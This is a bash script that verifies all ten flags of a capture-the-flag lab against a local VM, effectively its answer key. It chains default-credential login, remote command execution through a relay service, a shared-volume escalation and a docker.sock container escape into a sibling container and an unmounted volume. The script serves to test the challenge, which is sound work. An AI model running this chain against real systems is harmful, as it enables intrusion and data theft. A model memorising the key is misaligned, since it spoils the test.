#!/usr/bin/env bash
# verify.sh — proves all 10 flags end-to-end against the freshly
# provisioned VM, the same way a player would: HTTP against the web
# app's published port, SSH as relay_ops (the real foothold account),
# running the downloaded relay-client binary from there to reach
# relay over the docker-compose stack's own internal network, then
# the shared-volume escalation into vault and the real docker.sock
# escape -- never via any build-only shortcut.
set -euo pipefail
cd "$(dirname "$0")/.."

WEB_PORT=8006
SSH_PORT=2206
RELAY_OPS_PASS="ferryman2024"
RELEASE_SECRET=$(cat ../organizer/release-secret.txt)

check() {
    local n="$1" got="$2"
    local want
    want=$(python3 -c "
import hmac, hashlib
d = hmac.new('$RELEASE_SECRET'.encode(), f'legendary-ferrymans-relay:$n'.encode(), hashlib.sha256).hexdigest()
print(f'HLC{{{d[:10]}}}')")
    if [ "$got" = "$want" ]; then
        echo "flag $n: OK ($got)"
    else
        echo "flag $n: MISMATCH got='$got' want='$want'" >&2
        exit 1
    fi
}

WORK=$(mktemp -d)
JAR="$WORK/jar.txt"
trap 'rm -rf "$WORK"' EXIT

SSH() { sshpass -p "$RELAY_OPS_PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p "$SSH_PORT" relay_ops@localhost "$@"; }

echo "== flag 1: page source =="
F1=$(curl -s "http://localhost:$WEB_PORT/" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 1 "$F1"

echo "== flag 2: default creds + client binary download link =="
curl -s -c "$JAR" -d "username=relay_ops&password=$RELAY_OPS_PASS" "http://localhost:$WEB_PORT/login" -o "$WORK/login.html"
F2=$(grep -oE 'HLC\{[a-f0-9]{10}\}' "$WORK/login.html")
check 2 "$F2"

echo "== real foothold: SSH to web as relay_ops, fetch the client binary from there =="
# Inside the web container itself, the app listens on its own internal
# port 5000, not the externally-mapped 8006.
SSH "curl -s http://localhost:5000/downloads/relay-client -o /tmp/relay-client; chmod +x /tmp/relay-client"

echo "== flag 3: VERSION (no auth, reversed protocol magic) =="
F3=$(SSH "/tmp/relay-client relay 9099 VERSION" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 3 "$F3"

echo "== flag 4: STATUS (reversed XOR-decoded auth token) =="
F4=$(SSH "/tmp/relay-client relay 9099 STATUS" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 4 "$F4"

echo "== flag 5: RUN -> RCE on relay, plus the dossier passphrase =="
F5=$(SSH "/tmp/relay-client relay 9099 RUN 'cat /opt/relay/secret/flag5.txt'" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 5 "$F5"
DOSSIER_PW=$(SSH "/tmp/relay-client relay 9099 RUN 'cat /opt/relay/secret/relay.conf'" | sed -n 's/emergency_recovery_passphrase=//p')

run_on_vault() {
    local b64
    b64=$(printf '%s' "$1" | base64 -w0)
    SSH "/tmp/relay-client relay 9099 RUN 'rm -f /shared/task_output.txt; echo $b64 | base64 -d > /shared/task.sh'" >/dev/null
    for i in $(seq 1 30); do
        local out
        out=$(SSH "/tmp/relay-client relay 9099 RUN 'cat /shared/task_output.txt 2>/dev/null'" 2>/dev/null)
        if [ -n "$out" ]; then echo "$out"; return; fi
        sleep 2
    done
}

echo "== flags 6/7: shared-volume job-queue escalation into vault =="
VAULT_OUT=$(run_on_vault 'cat /opt/vault/secret/flag6.txt /opt/vault/secret/flag7.txt')
F6=$(echo "$VAULT_OUT" | sed -n '1p')
check 6 "$F6"
F7=$(echo "$VAULT_OUT" | sed -n '2p')
check 7 "$F7"

echo "== flag 8: real docker.sock escape, docker exec into sibling web container =="
F8=$(run_on_vault 'DOCKER_API_VERSION=1.44 docker exec halcyon-legendary-web cat /opt/web/secret/flag8.txt')
check 8 "$F8"

echo "== flag 9: same socket, spin up a fresh container to reach the unmounted volume =="
HOSTSEC_OUT=$(run_on_vault 'DOCKER_API_VERSION=1.44 docker run --rm -v halcyon-legendary-host-secrets:/data alpine sh -c "cat /data/flag9.txt; echo ---SPLIT---; base64 -w0 /data/dossier.enc"')
F9=$(echo "$HOSTSEC_OUT" | sed -n '1p')
check 9 "$F9"
B64_DOSSIER=$(echo "$HOSTSEC_OUT" | sed -n '/---SPLIT---/,$p' | tail -n +2 | tr -d '\n')

echo "== flag 10: combine with the passphrase recovered back in step 5 =="
echo "$B64_DOSSIER" | base64 -d > "$WORK/dossier.enc"
F10=$(python3 -c "
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

MAGIC = b'HLCX1'
with open('$WORK/dossier.enc', 'rb') as f:
    blob = f.read()
rest = blob[len(MAGIC):]
salt, nonce, ct = rest[:16], rest[16:28], rest[28:]
key = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1).derive('$DOSSIER_PW'.encode())
print(AESGCM(key).decrypt(nonce, ct, None).decode())
")
check 10 "$F10"

echo
echo "All 10 flags verified end-to-end."
